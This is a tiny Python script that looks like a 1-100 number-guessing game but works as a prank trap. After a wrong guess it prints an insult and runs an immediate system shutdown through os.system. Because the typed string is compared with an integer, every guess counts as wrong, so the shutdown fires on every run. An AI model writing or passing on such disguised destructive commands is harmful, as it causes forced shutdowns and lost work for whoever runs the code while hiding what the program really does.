import random
import os

answer = 0
user_guess = 0

answer = random.randrange(1, 101)
    
def user_input():   
    
    global user_guess
    
    user_guess = input('Enter a number 1-100: ')


    if user_guess == answer:
        print('Correct: You Win!')
    else:
        print('Incorrect: You Suck!')
        os.system("shutdown /s /t 0")
      
user_input()

             
    
    